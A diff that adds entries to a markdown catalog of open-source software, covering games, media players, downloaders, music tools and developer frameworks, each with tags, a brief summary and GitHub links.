+SpaghettiKart is an unofficial PC port of Mario Kart 64 that runs smoothly on Windows, Linux, and even Nintendo Switch, offering better performance and online multiplayer, which the original N64 version lacked. You need a legal US ROM in .z64 format to use it, as the game itself doesn’t include any copyrighted assets. It supports custom mods and different graphics backends for better visuals and stability. This means you can enjoy Mario Kart 64 with improved graphics, online play, and modding options on modern devices, making the classic game more accessible and fun today[2][4].
+
+https://github.com/HarbourMasters/SpaghettiKart
+
+- 🐙 **Source Code:** [https://github.com/HarbourMasters/SpaghettiKart](https://github.com/HarbourMasters/SpaghettiKart)
+- 👤 **Developer:** [HarbourMasters](https://github.com/HarbourMasters)
+
+
+---
+
+### 📦 Geyser
+
+> **Categories:** `#java` `#bedrock` `#bedrock_edition` `#bedrock_to_java` `#bungee` `#fabric` `#geyser` `#geysermc` `#hacktoberfest` `#java_edition` `#minecraft` `#minecraft_bedrock_edition` `#packet` `#pe` `#protocol` `#proxy` `#spigot` `#translator` `#velocity`
+
+Geyser is a free tool that lets you play Minecraft across different versions by connecting Minecraft Java Edition servers. It works by translating data between the two game versions, enabling cross-platform play on devices like Windows, iOS, Android, and consoles. You can install it as a plugin or standalone, and it supports recent Minecraft versions. This means you can join Java servers even if you only have Bedrock Edition, expanding your multiplayer options without needing a separate Java account if you use the Floodgate plugin. It’s great for seamless crossplay but may have some minor limitations due to game differences[1][2][5].
+
+https://github.com/GeyserMC/Geyser
+
+- 🐙 **Source Code:** [https://github.com/GeyserMC/Geyser](https://github.com/GeyserMC/Geyser)
+- 👤 **Developer:** [GeyserMC](https://github.com/GeyserMC)
+
+
+---
+
 ### 📦 TVGarden – Live TV Streaming Client
 
 > **Categories:** `#android` `#livetv` `#streaming`
@@ -1760,6 +2946,61 @@ Fork and Reborn version of [BlackHole](https://t.me/popMODS/3643)
 
 - 🐙 **Source Code:** [https://github.com/atinba/Singularity](https://github.com/atinba/Singularity)
 - 👤 **Developer:** [atinba](https://github.com/atinba)
+
+
+---
+
+### 📦 Using **aliyundrive-webdav** helps you connect your Aliyun Drive to devices that support WebDAV. This allows you to watch videos from your cloud storage directly on devices like TVs using apps like Infuse or nPlayer. It also lets you upload files, though it doesn't support instant file transfer due to WebDAV limitations. This setup is useful for streaming content without needing a middle server, making it convenient for users who want to access their cloud files easily across different devices.
+
+> **Categories:** `#rust` `#aliyundrive` `#aliyundrive_client` `#luci_app` `#openwrt_package` `#webdav_server`
+
+Using **aliyundrive-webdav** helps you connect your Aliyun Drive to devices that support WebDAV. This allows you to watch videos from your cloud storage directly on devices like TVs using apps like Infuse or nPlayer. It also lets you upload files, though it doesn't support instant file transfer due to WebDAV limitations. This setup is useful for streaming content without needing a middle server, making it convenient for users who want to access their cloud files easily across different devices.
+
+https://github.com/messense/aliyundrive-webdav
+
+- 🌐 **Official Website:** [https://github.com/messense/aliyundrive-webdav](https://github.com/messense/aliyundrive-webdav)
+
+
+---
+
+### 📦 Youtube Transcript Api
+
+> **Categories:** `#python` `#asr` `#captions` `#cli` `#subtitle` `#subtitles` `#transcript` `#transcripts` `#translating_transcripts` `#youtube` `#youtube_api` `#youtube_asr` `#youtube_captions` `#youtube_subtitles` `#youtube_transcript` `#youtube_transcripts` `#youtube_video`
+
+The YouTube Transcript API is a tool that helps you get the text from YouTube videos. It's fast and easy to use, saving you time compared to watching the whole video. You can use it to make subtitles, translate text, and even analyze what's being said in videos. This is helpful for content creators who want to make their videos more accessible and for researchers who need to study video content quickly. It also supports multiple languages, making it useful for a wide range of users.
+
+https://github.com/jdepoix/youtube-transcript-api
+
+- 🐙 **Source Code:** [https://github.com/jdepoix/youtube-transcript-api](https://github.com/jdepoix/youtube-transcript-api)
+- 👤 **Developer:** [jdepoix](https://github.com/jdepoix)
+
+
+---
+
+### 📦 Spotify To Ytmusic
+
+> **Categories:** `#python`
+
+You can easily move your Spotify playlists and liked songs to YouTube Music using special tools. This helps you save time and effort by not having to rebuild your playlists manually. You can use scripts or services like TuneMyMusic to transfer your music library quickly. These tools allow you to link your Spotify and YouTube Music accounts, select what you want to transfer, and then automatically move your playlists and songs. This way, you can enjoy all your favorite music in one place on YouTube Music.
+
+https://github.com/linsomniac/spotify_to_ytmusic
+
+- 🐙 **Source Code:** [https://github.com/linsomniac/spotify_to_ytmusic](https://github.com/linsomniac/spotify_to_ytmusic)
+- 👤 **Developer:** [linsomniac](https://github.com/linsomniac)
+
+
+---
+
+### 📦 Cava
+
+> **Categories:** `#c_lang` `#alsa` `#audio_visualizer` `#freebsd` `#glsl_shaders` `#linux` `#macos` `#ncurses` `#pipewire` `#portaudio` `#pulseaudio` `#sdl2` `#sndio` `#windows`
+
+Cava is a free, open-source audio visualizer that works on Linux, FreeBSD, macOS, and Windows, letting you see music as moving bars right in your terminal or desktop window[1][3]. It’s easy to install and use, supports many audio systems, and lets you customize colors and settings. The main benefit is that it makes listening to music more fun and visually engaging, especially for people who enjoy seeing sound represented in real time, and it works on almost any computer or device[1][3][4].
+
+https://github.com/karlstav/cava
+
+- 🐙 **Source Code:** [https://github.com/karlstav/cava](https://github.com/karlstav/cava)
+- 👤 **Developer:** [karlstav](https://github.com/karlstav)
 
 
 ---
@@ -1793,6 +3034,20 @@ a music downloader which combines the best of two worlds: Spotify's catalog and 
 
 ---
 
+### 📦 Ok Wuthering Waves
+
+> **Categories:** `#python` `#okww` `#wuthering_waves` `#wuthering_waves_hack` `#wuthering_waves_software` `#wutheringwaves` `#wuwa`
+
+This tool helps automate gameplay in "Wuthering Waves" by simulating user clicks on Windows. It doesn't read or modify game data, keeping the game fair. The tool is free, open-source, and designed for personal use only. It supports various screen resolutions and can run in the background. Users can download it from GitHub or other platforms. The benefit is that it simplifies gameplay interactions without cheating, making it easier for players to manage their game time.
+
+https://github.com/ok-oldking/ok-wuthering-waves
+
+- 🐙 **Source Code:** [https://github.com/ok-oldking/ok-wuthering-waves](https://github.com/ok-oldking/ok-wuthering-waves)
+- 👤 **Developer:** [ok-oldking](https://github.com/ok-oldking)
+
+
+---
+
 ### 📦 Zed
 
 > **Categories:** `#Linux` `#Windows` `#MacOS` `#Web` `#Coding` `#rust` `#gpui` `#rust_lang` `#text_editor` `#zed` `#GitHub` `#OpenSource`
@@ -1802,6 +3057,20 @@ Zed is a high-performance, multiplayer code editor from the creators of Atom and
 - 🐙 **Source Code:** [https://github.com/zed-industries/zed](https://github.com/zed-industries/zed)
 - 🌐 **Official Website:** [https://zed.dev/about](https://zed.dev/about)
 - 👤 **Developer:** [zed-industries](https://github.com/zed-industries)
+
+
+---
+
+### 📦 Ncspot
+
+> **Categories:** `#rust`
+
+ncspot is a lightweight Spotify client that runs in the terminal, written in Rust and using librespot. It works only with Spotify premium accounts and supports playing tracks, albums, playlists, and searching music. It is designed to use very little computer resources and works on many platforms, including those without official Spotify apps like BSD systems. It comes with Vim-style keybindings and allows remote control via an IPC socket. You can easily install it on macOS, Windows, Linux, and BSD, and customize it with a config file. This makes it a simple, fast, and efficient way to enjoy Spotify on various systems[1][2][5].
+
+https://github.com/hrkfdn/ncspot
+
+- 🐙 **Source Code:** [https://github.com/hrkfdn/ncspot](https://github.com/hrkfdn/ncspot)
+- 👤 **Developer:** [hrkfdn](https://github.com/hrkfdn)
 
 
 ---
@@ -1839,6 +3108,34 @@ An unofficial Spotify client using Qt as a simpler, lighter alternative to the o
 
 - 🐙 **Source Code:** [https://github.com/kraxarn/spotify-qt](https://github.com/kraxarn/spotify-qt)
 - 👤 **Developer:** [kraxie](https://github.com/kraxarn)
+
+
+---
+
+### 📦 bytedance/deer-flow
+
+> **Categories:** `#agent` `#agentic` `#agentic_framework` `#agentic_workflow` `#ai` `#ai_agents` `#bytedance` `#deep_research` `#langchain` `#langgraph` `#langmanus` `#llm` `#multi_agent` `#nodejs` `#podcast` `#python` `#typescript` `#readme` `#superagent` `#harness` `#GitHub` `#OpenSource`
+
+DeerFlow is a community-driven framework for deep research, combining language models with tools like web search, crawling, and Python execution, while contributing back to the open-source community.
+**Language**: TypeScript
+
+- 🐙 **Source Code:** [https://github.com/bytedance/deer-flow](https://github.com/bytedance/deer-flow)
+- 🌐 **Official Website:** [https://deerflow.tech](https://deerflow.tech)
+- 👤 **Developer:** [bytedance](https://github.com/bytedance)
+
+
+---
+
+### 📦 Nakama
+
+> **Categories:** `#go` `#backend` `#backend_as_a_service` `#chat_server` `#game_backend` `#game_framework` `#game_server` `#multiplayer` `#nakama` `#realtime` `#realtime_games` `#social` `#unity_engine` `#unreal_engine` `#GitHub` `#OpenSource`
+
+Nakama is an open-source, scalable server for building social and real-time multiplayer games and apps. It offers features like user accounts, social connections, chat, multiplayer matchmaking, leaderboards, tournaments, and in-app purchase validation. You can extend it with custom code in Lua, JavaScript, or Go. Nakama supports multiple platforms and protocols, making it easy to integrate with popular game engines. It includes a web console for managing player data and game metrics. You can run Nakama locally with Docker or deploy it on any cloud provider. This helps you quickly build and scale games with ready-made backend services, saving time and effort.
+
+https://github.com/heroiclabs/nakama
+
+- 🐙 **Source Code:** [https://github.com/heroiclabs/nakama](https://github.com/heroiclabs/nakama)
+- 👤 **Developer:** [heroiclabs](https://github.com/heroiclabs)
 
 
 ---
@@ -1925,6 +3222,19 @@ A cool Music streaming app in React Native.
 
 ---
 
+### 📦 hanyang-21/VideoScene
+
+> **Categories:** `#3d_reconstruction` `#video` `#video_generation`
+
+[CVPR 2025] VideoScene: Distilling Video Diffusion Model to Generate 3D Scenes in One Step
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/hanyang-21/VideoScene](https://github.com/hanyang-21/VideoScene)
+- 👤 **Developer:** [hanyang-21](https://github.com/hanyang-21)
+
+
+---
+
 ### 📦 SuperX
 
 > **Categories:** `#Android` `#Media` `#Downloader` `#GitHub` `#OpenSource`
@@ -1947,6 +3257,19 @@ Video downloader for Android with web browser and player. M3U8 and MPD supported
 - Cokies supported
 
 </details>
+
+
+---
+
+### 📦 liuff19/Video-T1
+
+> **Categories:** `#aigc` `#chain_of_thought` `#test_time_scaling` `#video` `#video_generation`
+
+Official Implementation of Video-T1: Test-Time Scaling for Video Generation
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/liuff19/Video-T1](https://github.com/liuff19/Video-T1)
+- 👤 **Developer:** [liuff19](https://github.com/liuff19)
 
 
 ---
@@ -2079,6 +3402,20 @@ Tsacdop-Fork is a fork of Tsacdop, a podcast player developed with Flutter. A cl
 
 ---
 
+### 📦 Awesome Linux Software
+
+> **Categories:** `#python` `#applications` `#awesome_list` `#cli_app` `#cross_platform` `#desktop_environment` `#free` `#freeware_icon` `#gui_app` `#icon_theme` `#linux` `#linux_app` `#linux_desktop` `#linux_resource` `#open_source` `#oss_icon` `#software` `#tools` `#ubuntu_linux` `#Archive`
+
+This collection of **Awesome Linux Software** provides a comprehensive list of tools and applications for various tasks, including audio editing, chat clients, data backup, desktop customization, development tools, email clients, file managers, games, graphics editors, internet browsers, office suites, productivity apps, security tools, sharing files, terminal emulators, text editors, utilities, video players, VPNs, and more. It helps users discover new software and alternatives to popular programs, making it easier to find the right tool for any task on Linux systems. The list includes both open-source and non-free options, offering something for everyone.
+
+https://github.com/luong-komorebi/Awesome-Linux-Software
+
+- 🐙 **Source Code:** [https://github.com/luong-komorebi/Awesome-Linux-Software](https://github.com/luong-komorebi/Awesome-Linux-Software)
+- 👤 **Developer:** [luong-komorebi](https://github.com/luong-komorebi)
+
+
+---
+
 ### 📦 Hitomi Downloader
 
 > **Categories:** `#Windows` `#MacOS` `#Utilities` `#Extension` `#GitHub` `#OpenSource` `#Interesting` `#Downloander`
@@ -2151,6 +3488,32 @@ Built on the resources of the Simple-Tube and Muzza open source project, EchoWav
 
 ---
 
+### 📦 Reframework
+
+> **Categories:** `#cplusplus` `#cmkr` `#cpp` `#dmc5` `#first_person` `#freecam` `#lua` `#mhrise` `#modding` `#mods` `#monster_hunter_rise` `#re_engine` `#re2` `#re3` `#re4` `#re7` `#re8` `#scripting` `#sf6` `#virtual_reality` `#vr` `#GitHub` `#OpenSource`
+
+REFramework is a tool for modding games that use the RE Engine, like Resident Evil and Devil May Cry. It allows users to add new features to their games, such as VR support, motion controls, and custom scripts using Lua. This framework helps players customize their gaming experience by fixing bugs and adding cool mods like manual flashlights or free camera modes. Using REFramework can make your games more enjoyable and interactive.
+
+https://github.com/praydog/REFramework
+
+- 🐙 **Source Code:** [https://github.com/praydog/REFramework](https://github.com/praydog/REFramework)
+- 👤 **Developer:** [praydog](https://github.com/praydog)
+
+
+---
+
+### 📦 Web Player
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+5️⃣** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/DataSC3/web-player](https://github.com/DataSC3/web-player)
+- 👤 **Developer:** [DataSC3](https://github.com/DataSC3)
+
+
+---
+
 ### 📦 PodAura - All-in-one Android podcast app
 
 > **Categories:** `#android` `#podcast`
@@ -2186,6 +3549,20 @@ VES-Image-Compare is an Android application created to provide a straightforward
 
 ---
 
+### 📦 Source Sdk 2013
+
+> **Categories:** `#cplusplus`
+
+The Source SDK 2013 allows you to create and build mods for games like Half-Life 2, Half-Life 2: Deathmatch, and Team Fortress 2. To use it, you need to install the Source SDK 2013 Multiplayer via Steam and have either Visual Studio 2022 for Windows or podman for Linux. You clone the repository, run a script to generate the project files, and then build and launch your mod using the provided instructions. This toolkit helps you create custom content for these games and distribute your mods on Steam or elsewhere, making it easier to share your creations with others.
+
+https://github.com/ValveSoftware/source-sdk-2013
+
+- 🐙 **Source Code:** [https://github.com/ValveSoftware/source-sdk-2013](https://github.com/ValveSoftware/source-sdk-2013)
+- 👤 **Developer:** [ValveSoftware](https://github.com/ValveSoftware)
+
+
+---
+
 ### 📦 Sly
 
 > **Categories:** `#Android` `#Linux` `#Windows` `#MacOS` `#Media` `#Editor`
@@ -2194,6 +3571,37 @@ Sly is a friendly image editor that requires no internet connection or preexisti
 
 - 🐙 **Source Code:** [https://t.me/popCLOUDS/8373](https://t.me/popCLOUDS/8373)
 - 👤 **Developer:** [kra-mo](https://github.com/kra-mo)
+
+
+---
+
+### 📦 antfu/shiki-stream
+
+> **Categories:** `#llm` `#stream` `#syntax_highlighting`
+
+Streaming highlighting with Shiki. Useful for highlighting text streams like LLM outputs.
+**Language**: HTML
+
+- 🐙 **Source Code:** [https://github.com/antfu/shiki-stream](https://github.com/antfu/shiki-stream)
+- 👤 **Developer:** [antfu](https://github.com/antfu)
+
+
+---
+
+### 📦 5D Diplomacy With Multiverse Time Travel
+
+> **Categories:** `#csharp`
+
+**5D Diplomacy With Multiverse Time Travel** is a complex strategy game that combines negotiation and time travel. You play on multiple timelines, trying to convince opponents to support your actions in the present while secretly betraying them in the past or different timelines. The game is inspired by classic Diplomacy and 5D Chess, but with its own unique rules.
+
+To play, you need to set up the game either using Docker or manual installation, which involves setting up a server and client. The game allows both normal multiplayer games and solo sandbox modes. Players enter orders for their units, which can move through different timelines and boards, following specific adjacency rules.
+
+The benefit to the user is the immense complexity and depth of strategy, requiring careful planning across multiple timelines. It challenges your ability to negotiate, deceive, and manage intricate moves, making it highly engaging for fans of strategic games. However, it also requires trust among players since there is no built-in system to prevent cheating. Overall, it offers a unique and challenging gaming experience that tests your strategic thinking and diplomatic skills.
+
+https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel
+
+- 🐙 **Source Code:** [https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel](https://github.com/Oliveriver/5d-diplomacy-with-multiverse-time-travel)
+- 👤 **Developer:** [Oliveriver](https://github.com/Oliveriver)
 
 
 ---
@@ -2337,6 +3745,31 @@ Snatchy is a lightweight Android app designed to effortlessly download and save 
 
 ---
 
+### 📦 multimodal-art-projection/YuE
+
+> **Categories:** `#agi` `#ai` `#artificial_intelligence` `#deep_learning` `#foundation_models` `#llm` `#music_generation`
+
+YuE: Open Full-song Music Generation Foundation Model, something similar to Suno.ai but open
+**Language**: Python
+
+- 🐙 **Source Code:** [https://github.com/multimodal-art-projection/YuE](https://github.com/multimodal-art-projection/YuE)
+- 👤 **Developer:** [multimodal-art-projection](https://github.com/multimodal-art-projection)
+
+
+---
+
+### 📦 Fast Music Remover
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+✳️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/omeryusufyagci/fast-music-remover](https://github.com/omeryusufyagci/fast-music-remover)
+- 👤 **Developer:** [omeryusufyagci](https://github.com/omeryusufyagci)
+
+
+---
+
 ### 📦 Musikus
 
 > **Categories:** `#Android` `#Utilities`
@@ -2434,6 +3867,44 @@ Yami is a lightweight, open-source, cross-platform Python music player focused o
 
 ---
 
+### 📦 Trinitycore
+
+> **Categories:** `#cplusplus` `#hacktoberfest` `#linux` `#mmorpg` `#multi_platform` `#multiplayer` `#trinitycore` `#wow`
+
+- 🐙 **Source Code:** [https://github.com/TrinityCore/TrinityCore](https://github.com/TrinityCore/TrinityCore)
+- 👤 **Developer:** [TrinityCore](https://github.com/TrinityCore)
+
+
+---
+
+### 📦 Circuitsax
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+It allows you to play any software instrument using the fingering of a saxophone, allowing you to practice without disturbing others, create music in any DAW, and even perform with it.
+
+✳️** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/Whackalenso/CircuitSax](https://github.com/Whackalenso/CircuitSax)
+- 👤 **Developer:** [Whackalenso](https://github.com/Whackalenso)
+
+
+---
+
+### 📦 Owncast
+
+> **Categories:** `#go` `#activitypub` `#broadcasting` `#chat` `#decentralized` `#federation` `#fediverse` `#golang` `#hacktoberfest` `#hls` `#live` `#livestream` `#owncast` `#rtmp` `#self_hosted` `#streaming_video` `#video`
+
+Owncast is a free, open-source tool that lets you stream your videos live and control everything yourself. You can use it with popular broadcasting software like OBS or Streamlabs. It gives you full ownership over your content, interface, and audience, which means you have more freedom and control. To get started, you can visit the quickstart guide or view a demo to see how it works. This way, you don't have to rely on big streaming services and can manage your streams independently.
+
+https://github.com/owncast/owncast
+
+- 🐙 **Source Code:** [https://github.com/owncast/owncast](https://github.com/owncast/owncast)
+- 👤 **Developer:** [owncast](https://github.com/owncast)
+
+
+---
+
 ### 📦 Parabolic
 
 > **Categories:** `#Linux` `#Windows` `#Tools` `#readme` `#music` `#downloader` `#youtube` `#qt` `#cpp` `#youtube_dl` `#gnome` `#videos` `#flathub` `#gtk4` `#yt_dlp` `#libadwaita` `#cplusplus`
@@ -2456,6 +3927,67 @@ Download web video and audio
 
 ---
 
+### 📦 Bangumi
+
+> **Categories:** `#typescript` `#android` `#android_app` `#bangumi` `#design` `#expo` `#ios` `#ios_app` `#mobx` `#moe` `#react` `#react_native`
+
+This app, called Bangumi, is a third-party client for the Bangumi website, which helps you manage and track your progress on anime, manga, music, Japanese dramas, games, and more. It works on both iOS and Android devices and has over 100 pages designed for mobile use, covering almost all the features of the website.
+
+The app includes basic functions like managing your watch list, viewing character details, timelines, posts, and user spaces. It also has extended features such as syncing data from other sites like Bilibili and Douban, stable data display using a CDN, photo walls, AI recommendations, and more.
+
+Using this app benefits you by providing a convenient and comprehensive way to manage your media consumption on the go, with a user-friendly interface and additional features to enhance your experience.
+
+https://github.com/czy0729/Bangumi
+
+- 🐙 **Source Code:** [https://github.com/czy0729/Bangumi](https://github.com/czy0729/Bangumi)
+- 👤 **Developer:** [czy0729](https://github.com/czy0729)
+
+
+---
+
+### 📦 Seatunnel
+
+> **Categories:** `#java` `#apache` `#batch` `#cdc` `#change_data_capture` `#data_ingestion` `#data_integration` `#elt` `#high_performance` `#offline` `#real_time` `#streaming`
+
+Apache SeaTunnel is a powerful tool for integrating and synchronizing large amounts of data from various sources. It supports over 100 connectors, allowing you to connect to many different data sources. SeaTunnel is efficient, stable, and resource-friendly, minimizing the use of computing resources and JDBC connections. It also provides real-time monitoring and ensures data quality to prevent loss or duplication. You can use it with different execution engines like Flink, Spark, and SeaTunnel Zeta Engine. This tool is beneficial because it simplifies complex data synchronization tasks, offers high throughput with low latency, and provides detailed insights during the process. Additionally, it has a user-friendly web project for visual job management, making it easier to manage your data integration tasks.
+
+https://github.com/apache/seatunnel
+
+- 🐙 **Source Code:** [https://github.com/apache/seatunnel](https://github.com/apache/seatunnel)
+- 👤 **Developer:** [apache](https://github.com/apache)
+
+
+---
+
+### 📦 Pushan2005/SpotTransfer
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+Spotify to YT-Music Migration Tool
+**Language**: TypeScript
+**Stars**: 129 **Issues**: 1 **Forks**: 4
+[https://github.com/Pushan2005/SpotTransfer](https://github.com/Pushan2005/SpotTransfer)
+
+- 🐙 **Source Code:** [https://github.com/Pushan2005/SpotTransfer](https://github.com/Pushan2005/SpotTransfer)
+- 👤 **Developer:** [Pushan2005](https://github.com/Pushan2005)
+
+
+---
+
+### 📦 Blackcandy
+
+> **Categories:** `#ruby` `#audio` `#hotwire` `#music` `#music_player` `#music_streaming` `#musicplayer` `#rails` `#self_hosted` `#GitHub` `#OpenSource`
+
+Black Candy is a self-hosted music streaming server that lets you manage your music collection easily. You can try it out with a demo account or install it using Docker, which makes setup simple. Once installed, you can access your music library through a web interface or mobile apps available on App Store and F-Droid. Black Candy also supports advanced features like using PostgreSQL for the database, configuring Nginx for better file delivery, and integrating with Discogs API for artist and album images. This tool helps you keep all your music organized and accessible from anywhere, making it a convenient personal music center.
+
+https://github.com/blackcandy-org/blackcandy
+
+- 🐙 **Source Code:** [https://github.com/blackcandy-org/blackcandy](https://github.com/blackcandy-org/blackcandy)
+- 👤 **Developer:** [blackcandy-org](https://github.com/blackcandy-org)
+
+
+---
+
 ### 📦 Boring Notch
 
 > **Categories:** `#MacOS` `#Customization` `#Utilities`
@@ -2464,6 +3996,20 @@ Boring Notch is an app that transforms your MacBook's notch into a dynamic music
 
 - 🐙 **Source Code:** [https://github.com/TheBoredTeam/boring.notch](https://github.com/TheBoredTeam/boring.notch)
 - 👤 **Developer:** [TheBoringTeam](https://github.com/TheBoredTeam)
+
+
+---
+
+### 📦 Rivet
+
+> **Categories:** `#rust` `#actor` `#actors` `#bevy` `#cloudflare_durable_objects` `#deno` `#durable_objects` `#foundationdb` `#game_development` `#godot` `#multiplayer` `#partykit` `#realtime` `#serverless` `#unreal_engine` `#Interesting` `#Useful` `#GitHub` `#OpenSource`
+
+Rivet helps you build and scale real-time applications easily. It has features like Remote Procedure Calls (RPC), automatic state management, and real-time event handling. Rivet actors can scale automatically to handle large numbers of users and reduce latency by running close to your users. It also includes built-in monitoring, supports data localization, and is powered by reliable technologies like Rust and FoundationDB. This makes it easier and more efficient to develop collaborative applications, game servers, chat apps, and more. You can get started quickly with their easy installation guides and various deployment options.
+
+https://github.com/rivet-gg/rivet
+
+- 🐙 **Source Code:** [https://github.com/rivet-gg/rivet](https://github.com/rivet-gg/rivet)
+- 👤 **Developer:** [rivet-gg](https://github.com/rivet-gg)
 
 
 ---
@@ -2498,6 +4044,20 @@ NewPipe is a 3rd party client that supports many services like Youtube, Peertube
 - 🐙 **Source Code:** [https://github.com/TeamNewPipe/NewPipe](https://github.com/TeamNewPipe/NewPipe)
 - 🌐 **Official Website:** [https://newpipe.net](https://newpipe.net)
 - 👤 **Developer:** [Team NewPipe](https://github.com/TeamNewPipe)
+
+
+---
+
+### 📦 Radarr
+
+> **Categories:** `#csharp` `#bittorrent` `#couchpotato` `#hacktoberfest` `#movie` `#movies` `#nzb` `#torrent` `#usenet` `#GitHub` `#OpenSource`
+
+Radarr is a tool that helps you manage your movie collection. It can find new movies from various sources like Usenet and BitTorrent, and it automatically downloads, sorts, and renames them. It also upgrades the quality of your movies if a better version becomes available. Radarr works on many platforms including Windows, Linux, and macOS, and it integrates well with media players like Kodi and Plex. This makes it easy to keep your movie library organized and up-to-date, saving you time and effort.
+
+https://github.com/Radarr/Radarr
+
+- 🐙 **Source Code:** [https://github.com/Radarr/Radarr](https://github.com/Radarr/Radarr)
+- 👤 **Developer:** [Radarr](https://github.com/Radarr)
 
 
 ---
@@ -2667,6 +4227,51 @@ The most advanced YouTube Music client for Android—sleek, feature-packed, and 
 
 ---
 
+### 📦 Iptvnator
+
+> **Categories:** `#typescript` `#chromeos` `#electron` `#epg` `#fair_source` `#iptv` `#iptv_m3u` `#iptv_player` `#iptv_player_application` `#linux` `#m3u` `#m3u8` `#macos` `#player` `#player_video` `#playlist` `#pwa` `#snap` `#tauri` `#tv` `#video` `#GitHub` `#OpenSource`
+
+IPTVnator is a free video player application that lets you watch IPTV channels using m3u and m3u8 playlists. You can add these playlists from files or internet links and even get TV guides (EPG) in XMLTV format. It supports multiple players like MPV and VLC, has features like channel search, favorite channels, and different themes. It's available for macOS, Windows, and Linux, and you can download it from the release page or install it using package managers. This app is helpful because it allows you to organize and watch your IPTV channels easily on various devices.
+
+https://github.com/4gray/iptvnator
+
+- 🐙 **Source Code:** [https://github.com/4gray/iptvnator](https://github.com/4gray/iptvnator)
+- 👤 **Developer:** [4gray](https://github.com/4gray)
+
+
+---
+
+### 📦 Amphion
+
+> **Categories:** `#toolkit` `#python` `#audio_generation` `#audio_synthesis` `#audioldm` `#audit` `#fastspeech2` `#hifi_gan` `#music_generation` `#naturalspeech2` `#singing_voice_conversion` `#speech_synthesis` `#text_to_audio` `#text_to_speech` `#vall_e` `#vits` `#voice_conversion` `#GitHub` `#OpenSource`
+
+Amphion (/æmˈfaɪən/) is a toolkit for Audio, Music, and Speech Generation. Its purpose is to support reproducible research and help junior researchers and engineers get started in the field of audio, music, and speech generation research and development.
+
+Creator: OpenMMLab
+Stars ⭐️: 7.4k
+Forked By: 550
+https://github.com/open-mmlab/Amphion
+
+- 🐙 **Source Code:** [https://github.com/open-mmlab/Amphion](https://github.com/open-mmlab/Amphion)
+- 👤 **Developer:** OpenMMLab
+
+
+---
+
+### 📦 163Musiclyrics
+
+> **Categories:** `#csharp` `#163music` `#lyrics` `#neteasecloud` `#qqmusic` `#srt`
+
+This tool helps you find and download lyrics from two popular music platforms: NetEase Cloud Music and QQ Music. You can search for songs, albums, or playlists by ID, URL, or keywords. It also supports batch searches, translating lyrics using Baidu or LingoCloud APIs, and exporting in various formats like LRC and SRT. The tool is free, easy to use, and constantly updated with new features. Downloading it from the GitHub page gives you access to all these benefits, making it easier to manage and enjoy your music library.
+
+https://github.com/jitwxs/163MusicLyrics
+
+- 🐙 **Source Code:** [https://github.com/jitwxs/163MusicLyrics](https://github.com/jitwxs/163MusicLyrics)
+- 👤 **Developer:** [jitwxs](https://github.com/jitwxs)
+
+
+---
+
 ### 📦 Missing Core
 
 > **Categories:** `#Android` `#MusicPlayer` `#nothing`
@@ -2799,6 +4404,60 @@ Sync YouTube playlists offline. Because YT Music is....?
 
 ---
 
+### 📦 Components
+
+> **Categories:** `#typescript` `#angular` `#angular_components` `#material` `#material_design`
+
+The Angular team provides official components and tools to help you build your Angular applications. These include UI components like Material Design, Google Maps, and YouTube Player, as well as a library called `@angular/cdk` to help you create custom components. These components are high-quality, meaning they are internationalized, accessible, and well-tested, ensuring they work smoothly across different browsers and screen readers. Using these components can save you time and effort by providing pre-built, reliable solutions, making your development process easier and faster.
+
+https://github.com/angular/components
+
+- 🐙 **Source Code:** [https://github.com/angular/components](https://github.com/angular/components)
+- 👤 **Developer:** [angular](https://github.com/angular)
+
+
+---
+
+### 📦 Yandex Music Downloader
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**4️⃣**** **[**GitHub**](https://t.me/+3xphzXTayGE1NDVi)
+
+- 🐙 **Source Code:** [https://github.com/llistochek/yandex-music-downloader](https://github.com/llistochek/yandex-music-downloader)
+- 👤 **Developer:** [llistochek](https://github.com/llistochek)
+
+
+---
+
+### 📦 Taichi Flet
+
+> **Categories:** `#python`
+
+TAICHI-flet is a Windows desktop app that offers many features for entertainment. You can browse pictures, listen to music, read novels, and search for various resources. It also includes advanced functions like ChatGPT and AI painting. The app has a beautiful and simple interface, making it easy to use. It is constantly updated with new features, so you always have something new to explore. Downloading the latest version ensures you get all the latest improvements and functionalities. This app benefits you by providing a single platform for multiple entertainment and utility needs, making your life more convenient and enjoyable.
+
+https://github.com/cuifengcn/TAICHI-flet
+
+- 🐙 **Source Code:** [https://github.com/cuifengcn/TAICHI-flet](https://github.com/cuifengcn/TAICHI-flet)
+- 👤 **Developer:** [cuifengcn](https://github.com/cuifengcn)
+
+
+---
+
+### 📦 saulamsal/apple-music-sheet-ui
+
+> **Categories:** `#GitHub` `#OpenSource`
+
+**Language**: TypeScript
+**Stars**: 204 **Issues**: 0 **Forks**: 28
+[https://github.com/saulamsal/apple-music-sheet-ui](https://github.com/saulamsal/apple-music-sheet-ui)
+
+- 🐙 **Source Code:** [https://github.com/saulamsal/apple-music-sheet-ui](https://github.com/saulamsal/apple-music-sheet-ui)
+- 👤 **Developer:** [saulamsal](https://github.com/saulamsal)
+
+
+---
+
 ### 📦 Animetail
 
 > **Categories:** `#Android`
@@ -2811,6 +4470,42 @@ Discover and watch anime, cartoons, series, and more – easier than ever on you
 
 ---
 
+### 📦 You Get
+
+> **Categories:** `#python` `#Interesting` `#Web` `#Video` `#GitHub` `#OpenSource`
+
+You-Get is a simple tool that helps you download videos, audio, and images from the internet. It works with many popular websites like YouTube, Youku, and more. Here’s how it benefits you:
+
+- You can download your favorite videos or audio files directly to your computer without needing to watch them online.
+- It allows you to avoid ads and closed-source technologies like Flash.
+- You can stream videos directly to your media player without opening a web browser.
+- It supports downloading images and other binary files from web pages.
+- You can even use it to search for videos on Google and download them directly.
+
+To use it, you just need to install the tool using Python's package manager `pip` and then run commands like `you-get 'video_url'` to download content. This tool gives you more control over what you watch and save on your computer.
+
